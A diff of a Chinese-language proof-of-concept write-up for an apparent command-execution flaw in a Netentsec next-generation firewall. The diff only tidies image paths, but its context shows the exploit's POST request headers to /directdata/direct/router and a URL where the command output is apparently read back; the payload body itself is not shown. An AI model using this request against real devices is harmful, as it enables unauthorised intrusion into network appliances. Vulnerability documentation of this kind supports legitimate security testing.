@@ -20,12 +20,12 @@ app="网康科技-下一代防火墙"
 
 登录页面如下
 
-![](./images/202202162229920.png)
+![](images/202202162229920.png)
 
 发送如下请求包
 
 ```plain
-![2](C:\Users\47236\Desktop\2.png)POST /directdata/direct/router HTTP/1.1
+![](C:\Users\47236\Desktop\2.png)POST /directdata/direct/router HTTP/1.1
 Host: XXX.XXX.XXX.XXX
 Connection: close
 Content-Length: 179
@@ -46,5 +46,5 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 http://xxx.xxx.xxx.xxxx/test_cmd.txt
 ```
 
-![](./images/202202162229568.png)
+![](images/202202162229568.png)
 
